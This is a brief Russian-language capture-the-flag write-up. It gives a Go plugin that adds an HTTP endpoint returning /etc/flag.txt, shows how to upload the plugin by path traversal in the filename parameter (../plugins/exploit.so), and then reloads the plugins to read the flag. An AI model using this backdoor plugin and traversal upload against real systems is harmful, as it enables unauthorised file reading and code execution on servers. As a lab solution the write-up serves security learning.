На сайте есть поддержка плагинов.

Создаём свой плагин примерно с таким содержанием

```go
package main

import (
	"net/http"
	"os"
)

var Name = "Exploit"
var Version = "1.0"

func pwn(w http.ResponseWriter, r *http.Request) {
	data, _ := os.ReadFile("/etc/flag.txt")
	w.Write(data)
}

func OnEnable(){
	http.HandleFunc("/pwn3d_by_g4l4g0sh1n", pwn)
}
```

Компилируем как .so плагин и загружаем в роут `/upload?filename=../plugins/exploit.so`

Переходим на `/reload`

Переходим на `/pwn3d_by_g4l4g0sh1n` и забираем флаг
